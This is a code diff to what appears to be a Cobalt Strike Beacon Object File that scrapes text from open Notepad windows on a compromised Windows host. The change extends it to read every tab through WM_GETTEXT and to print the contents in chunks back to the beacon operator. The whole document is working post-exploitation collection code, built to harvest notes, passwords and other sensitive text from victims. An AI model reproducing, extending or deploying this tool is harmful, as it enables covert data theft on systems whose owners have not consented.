@@ -115,9 +115,12 @@ typedef struct {
 #define NUM_EDITOR_CLASSES 4
 #define MAX_DEBUG_CLASSES 6
 #define MAX_CLASS_NAME_LEN 48
+#define MAX_TAB_CONTROLS 8
 
 typedef struct {
-    HWND hwndBest;
+    HWND editControls[MAX_TAB_CONTROLS];
+    int editCount;
+    HWND hwndHeuristic;
     int bestPriority;
     LRESULT heuristicLen;
     int childCount;
@@ -386,15 +389,17 @@ BOOL CALLBACK FindEditorChildProc(HWND hwnd, LPARAM lParam) {
     }
 
     if (isKnownClass) {
-        data->hwndBest = hwnd;
-        data->bestPriority = 0;
-        return FALSE;
+        if (data->editCount < MAX_TAB_CONTROLS) {
+            data->editControls[data->editCount] = hwnd;
+            data->editCount++;
+        }
+        return TRUE;
     }
 
-    if (data->bestPriority > 0) {
+    if (data->editCount == 0 && data->bestPriority > 0) {
         LRESULT len = USER32$SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
         if (len > data->heuristicLen) {
-            data->hwndBest = hwnd;
+            data->hwndHeuristic = hwnd;
             data->bestPriority = 1;
             data->heuristicLen = len;
         }
@@ -418,14 +423,17 @@ BOOL CALLBACK FindEditorChildProc(HWND hwnd, LPARAM lParam) {
 }
 
 
-static BOOL extract_notepad_content(HWND hwndNotepad, char *outputBuffer, size_t bufferSize) {
-    HWND hwndEdit = NULL;
+static BOOL extract_notepad_content(HWND hwndNotepad, char *outputBuffer, size_t bufferSize, int *tabsFound) {
     LRESULT textLength = 0;
     LRESULT bytesCopied = 0;
     size_t actualSize = 0;
     ChildSearchData searchData;
-    int i;
+    int i, tabCount, totalLen, offset, chunkLen;
     char matchClass[64];
+    char savedChar;
+    HWND *controls;
+    HWND fallback[1];
+    BOOL anyContent = FALSE;
 
     if (hwndNotepad == NULL || outputBuffer == NULL || bufferSize == 0) {
         return FALSE;
@@ -446,56 +454,89 @@ static BOOL extract_notepad_content(HWND hwndNotepad, char *outputBuffer, size_t
 
     USER32$EnumChildWindows(hwndNotepad, FindEditorChildProc, (LPARAM)&searchData);
 
-    hwndEdit = searchData.hwndBest;
-
-    if (hwndEdit == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find text control\n");
-        return FALSE;
-    }
-
-    if (searchData.bestPriority > 0) {
+    if (searchData.editCount == 0) {
+        if (searchData.hwndHeuristic == NULL) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find text control\n");
+            return FALSE;
+        }
         inline_memset(matchClass, 0, sizeof(matchClass));
-        USER32$GetClassNameA(hwndEdit, matchClass, sizeof(matchClass) - 1);
+        USER32$GetClassNameA(searchData.hwndHeuristic, matchClass, sizeof(matchClass) - 1);
         BeaconPrintf(CALLBACK_OUTPUT, "[i] Using heuristic match: %s\n", matchClass);
+        fallback[0] = searchData.hwndHeuristic;
+        controls = fallback;
+        tabCount = 1;
+    } else {
+        controls = searchData.editControls;
+        tabCount = searchData.editCount;
     }
 
-    textLength = USER32$SendMessageA(hwndEdit, WM_GETTEXTLENGTH, 0, 0);
-    if (textLength < 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get text length from text control\n");
-        return FALSE;
+    if (tabsFound != NULL) {
+        *tabsFound = tabCount;
     }
 
-    if (textLength == 0) {
-        outputBuffer[0] = '\0';
-        return TRUE;
+    for (i = 0; i < tabCount; i++) {
+        if (tabCount > 1) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[i] Tab %d:\n", i + 1);
+        }
+
+        textLength = USER32$SendMessageA(controls[i], WM_GETTEXTLENGTH, 0, 0);
+        if (textLength < 0) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get text length from tab %d\n", i + 1);
+            continue;
+        }
+
+        if (textLength == 0) {
+            if (tabCount > 1) {
+                BeaconPrintf(CALLBACK_OUTPUT, "[i] (empty)\n");
+            }
+            continue;
+        }
+
+        if (textLength > (MAX_NOTEPAD_BUFFER - 1)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Tab %d content exceeds maximum size (%lu bytes), truncating to %d bytes\n",
+                         i + 1, (unsigned long)textLength, MAX_NOTEPAD_BUFFER - 1);
+            textLength = MAX_NOTEPAD_BUFFER - 1;
+        }
+
+        actualSize = (size_t)textLength + 1;
+        if (actualSize > bufferSize) {
+            actualSize = bufferSize;
+        }
+
+        inline_memset(outputBuffer, 0, actualSize);
+
+        bytesCopied = USER32$SendMessageA(controls[i], WM_GETTEXT, (WPARAM)actualSize, (LPARAM)outputBuffer);
+        if (bytesCopied <= 0 || bytesCopied > (LRESULT)actualSize) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve text from tab %d (bytesCopied: %ld)\n", i + 1, (long)bytesCopied);
+            outputBuffer[0] = '\0';
+            continue;
+        }
+
+        if ((size_t)bytesCopied >= actualSize) {
+            bytesCopied = (LRESULT)(actualSize - 1);
+        }
+        outputBuffer[bytesCopied] = '\0';
+
+        if (outputBuffer[0] != '\0') {
+            totalLen = KERNEL32$lstrlenA(outputBuffer);
+            offset = 0;
+            while (offset < totalLen) {
+                chunkLen = totalLen - offset;
+                if (chunkLen > BOF_CHUNK_SIZE) {
+                    chunkLen = BOF_CHUNK_SIZE;
+                }
+                savedChar = outputBuffer[offset + chunkLen];
+                outputBuffer[offset + chunkLen] = '\0';
+                BeaconPrintf(CALLBACK_OUTPUT, "%s", &outputBuffer[offset]);
+                outputBuffer[offset + chunkLen] = savedChar;
+                offset += chunkLen;
+            }
+            BeaconPrintf(CALLBACK_OUTPUT, "\n");
+            anyContent = TRUE;
+        }
     }
 
-    if (textLength > (MAX_NOTEPAD_BUFFER - 1)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Notepad content exceeds maximum size (%lu bytes), truncating to %d bytes\n",
-                     (unsigned long)textLength, MAX_NOTEPAD_BUFFER - 1);
-        textLength = MAX_NOTEPAD_BUFFER - 1;
-    }
-
-    actualSize = (size_t)textLength + 1;
-    if (actualSize > bufferSize) {
-        actualSize = bufferSize;
-    }
-
-    inline_memset(outputBuffer, 0, actualSize);
-
-    bytesCopied = USER32$SendMessageA(hwndEdit, WM_GETTEXT, (WPARAM)actualSize, (LPARAM)outputBuffer);
-    if (bytesCopied < 0 || bytesCopied > (LRESULT)actualSize) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve text from text control (bytesCopied: %ld)\n", (long)bytesCopied);
-        outputBuffer[0] = '\0';
-        return FALSE;
-    }
-
-    if ((size_t)bytesCopied >= actualSize) {
-        bytesCopied = (LRESULT)(actualSize - 1);
-    }
-    outputBuffer[bytesCopied] = '\0';
-
-    return TRUE;
+    return anyContent;
 }
 
 
@@ -575,47 +616,29 @@ void go(char *args, unsigned long alen) {
     for (i = 0; i < enumData.count; i++) {
         HWND hwnd = enumData.windows[i];
         char windowTitle[256];
-        
+        int tabsFound = 0;
+
         if (hwnd == NULL || !USER32$IsWindow(hwnd)) {
             continue;
         }
-        
-        
+
+
         inline_memset(windowTitle, 0, sizeof(windowTitle));
         USER32$GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle) - 1);
-        
+
         if (windowTitle[0] != '\0') {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\n", windowTitle);
         } else {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Notepad instance %d\n", i + 1);
         }
-        
-        
+
+
         inline_memset(contentBuffer, 0, MAX_NOTEPAD_BUFFER);
 
-
-        success = extract_notepad_content(hwnd, contentBuffer, MAX_NOTEPAD_BUFFER);
+        success = extract_notepad_content(hwnd, contentBuffer, MAX_NOTEPAD_BUFFER, &tabsFound);
         if (!success) {
             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract content from Notepad instance %d\n", i + 1);
             continue;
-        }
-
-        
-        if (contentBuffer[0] != '\0') {
-            int totalLen = KERNEL32$lstrlenA(contentBuffer);
-            int offset = 0;
-            while (offset < totalLen) {
-                int chunkLen = totalLen - offset;
-                if (chunkLen > BOF_CHUNK_SIZE) {
-                    chunkLen = BOF_CHUNK_SIZE;
-                }
-                char savedChar = contentBuffer[offset + chunkLen];
-                contentBuffer[offset + chunkLen] = '\0';
-                BeaconPrintf(CALLBACK_OUTPUT, "%s", &contentBuffer[offset]);
-                contentBuffer[offset + chunkLen] = savedChar;
-                offset += chunkLen;
-            }
-            BeaconPrintf(CALLBACK_OUTPUT, "\n");
         }
     }
 
